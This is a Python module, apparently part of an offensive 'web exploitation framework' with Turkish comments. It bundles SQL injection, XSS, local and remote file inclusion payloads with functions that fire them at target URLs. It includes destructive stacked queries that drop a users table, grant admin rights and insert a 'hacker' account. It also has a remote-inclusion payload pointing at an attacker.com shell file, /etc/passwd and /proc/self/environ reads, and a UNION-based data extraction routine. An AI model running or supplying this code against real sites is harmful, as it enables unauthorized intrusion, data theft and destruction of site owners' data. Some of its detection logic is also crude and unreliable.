# core/web_exploitation.py
# Advanced Web Exploitation Framework - SQLi, XSS, LFI, RFI, CSRF

import requests
import urllib.parse
import re
from typing import Dict, List

class SQLiDetector:
    """Advanced SQL Injection Detection & Exploitation"""
    
    def __init__(self):
        self.payloads = {
            "union": [
                "' UNION SELECT NULL,@@version--",
                "' UNION SELECT table_name,column_name FROM information_schema.columns--",
                "' UNION SELECT user(),database(),version()--",
                "' UNION SELECT GROUP_CONCAT(table_name) FROM information_schema.tables--",
            ],
            "blind": [
                "' AND '1'='1",
                "' AND '1'='2",
                "' AND SLEEP(5)--",
                "' AND IF(1=1,SLEEP(5),0)--",
            ],
            "time_based": [
                "' AND SLEEP(5)#",
                "' AND BENCHMARK(5000000,SHA1('test'))#",
                "' OR IF(1=1,SLEEP(5),0)#",
            ],
            "error_based": [
                "' AND extractvalue(1,concat(0x7e,(SELECT @@version)))--",
                "' AND updatexml(1,concat(0x7e,(SELECT user())),1)--",
            ],
            "stacked_queries": [
                "'; DROP TABLE users--",
                "'; UPDATE users SET admin=1 WHERE id=1--",
                "'; INSERT INTO users VALUES('hacker','pass',1)--",
            ]
        }
    
    def detect_sqli(self, url: str, param: str, test_value: str = "1") -> Dict:
        """
        SQLi vuln'ı tespit et
        """
        results = {
            "vulnerable": False,
            "type": None,
            "severity": "low",
            "payloads": []
        }
        
        # UNION-based test
        for payload in self.payloads["union"][:2]:
            test_url = url.replace(test_value, payload)
            try:
                resp = requests.get(test_url, timeout=5)
                if "database()" in resp.text or "version" in resp.text.lower():
                    results["vulnerable"] = True
                    results["type"] = "UNION-based SQLi"
                    results["severity"] = "critical"
                    results["payloads"].append(payload)
                    return results
            except:
                pass
        
        # Time-based blind test
        for payload in self.payloads["time_based"][:2]:
            test_url = url.replace(test_value, payload)
            try:
                import time
                start = time.time()
                resp = requests.get(test_url, timeout=10)
                elapsed = time.time() - start
                
                if elapsed > 5:
                    results["vulnerable"] = True
                    results["type"] = "Time-based Blind SQLi"
                    results["severity"] = "high"
                    results["payloads"].append(payload)
                    return results
            except:
                pass
        
        return results
    
    def extract_data(self, url: str, param: str, query: str) -> str:
        """
        SQLi ile veri çıkar
        """
        payload = f"' UNION SELECT {query}--"
        test_url = url.replace(param, urllib.parse.quote(payload))
        
        try:
            resp = requests.get(test_url)
            # Veri parse et
            match = re.search(r'<td>(.*?)</td>', resp.text)
            if match:
                return match.group(1)
        except:
            pass
        
        return ""

class XSSDetector:
    """XSS Detection - Reflected, Stored, DOM"""
    
    def __init__(self):
        self.payloads = {
            "reflected": [
                "<script>alert('XSS')</script>",
                "<img src=x onerror=alert('XSS')>",
                "<svg onload=alert('XSS')>",
                "javascript:alert('XSS')",
                "<iframe src=javascript:alert('XSS')>",
            ],
            "event_handlers": [
                "onload=alert('XSS')",
                "onerror=alert('XSS')",
                "onmouseover=alert('XSS')",
                "onclick=alert('XSS')",
                "oninput=alert('XSS')",
            ],
            "svg": [
                "<svg/onload=alert('XSS')>",
                "<svg><script>alert('XSS')</script>",
                "<svg><animate onend=alert('XSS')>",
            ]
        }
    
    def detect_xss(self, url: str, param: str) -> Dict:
        """
        XSS vuln'ı tespit et
        """
        results = {
            "vulnerable": False,
            "type": None,
            "payloads": []
        }
        
        for payload in self.payloads["reflected"]:
            test_url = f"{url}?{param}={urllib.parse.quote(payload)}"
            try:
                resp = requests.get(test_url, timeout=5)
                if payload in resp.text:
                    results["vulnerable"] = True
                    results["type"] = "Reflected XSS"
                    results["payloads"].append(payload)
                    return results
            except:
                pass
        
        return results

class LFIDetector:
    """Local File Inclusion Detection"""
    
    def __init__(self):
        self.payloads = [
            "../etc/passwd",
            "../../etc/passwd",
            "../../../../etc/passwd",
            "..\\..\\windows\\win.ini",
            "file:///etc/passwd",
            "/proc/self/environ",
            "/proc/version",
        ]
    
    def detect_lfi(self, url: str, param: str) -> Dict:
        """
        LFI vuln'ı tespit et
        """
        results = {
            "vulnerable": False,
            "files": []
        }
        
        for payload in self.payloads:
            test_url = f"{url}?{param}={urllib.parse.quote(payload)}"
            try:
                resp = requests.get(test_url, timeout=5)
                if "root:" in resp.text or "uid=" in resp.text:
                    results["vulnerable"] = True
                    results["files"].append({
                        "payload": payload,
                        "content": resp.text[:200]
                    })
            except:
                pass
        
        return results

class RFIDetector:
    """Remote File Inclusion Detection"""
    
    def __init__(self):
        pass
    
    def detect_rfi(self, url: str, param: str) -> Dict:
        """
        RFI vuln'ı tespit et
        """
        results = {
            "vulnerable": False,
            "payloads": []
        }
        
        # External file referencing
        payloads = [
            "http://attacker.com/shell.txt",
            "http://127.0.0.1:8080/test",
            "ftp://files.example.com/shell.php",
        ]
        
        for payload in payloads:
            test_url = f"{url}?{param}={urllib.parse.quote(payload)}"
            try:
                resp = requests.get(test_url, timeout=5)
                if "PHP Warning" in resp.text or "include" in resp.text:
                    results["vulnerable"] = True
                    results["payloads"].append(payload)
            except:
                pass
        
        return results

class WebExploitationFramework:
    """Ana Web Exploitation Framework"""
    
    def __init__(self):
        self.sqli = SQLiDetector()
        self.xss = XSSDetector()
        self.lfi = LFIDetector()
        self.rfi = RFIDetector()
    
    def scan_url(self, url: str) -> Dict:
        """
        URL'yi tüm web vulnlarına karşı tara
        """
        results = {
            "url": url,
            "vulnerabilities": [],
            "risk_score": 0
        }
        
        # Parametreleri çıkar
        parsed = urllib.parse.urlparse(url)
        params = urllib.parse.parse_qs(parsed.query)
        
        for param in params.keys():
            # SQLi test
            sqli_result = self.sqli.detect_sqli(url, param)
            if sqli_result["vulnerable"]:
                results["vulnerabilities"].append(sqli_result)
                results["risk_score"] += 10
            
            # XSS test
            xss_result = self.xss.detect_xss(url, param)
            if xss_result["vulnerable"]:
                results["vulnerabilities"].append(xss_result)
                results["risk_score"] += 7
            
            # LFI test
            lfi_result = self.lfi.detect_lfi(url, param)
            if lfi_result["vulnerable"]:
                results["vulnerabilities"].append(lfi_result)
                results["risk_score"] += 8
        
        return results
    
    def exploit_sqli(self, url: str, param: str, command: str) -> str:
        """
        SQLi ile komut çalıştır (veya veri çıkar)
        """
        return self.sqli.extract_data(url, param, command)
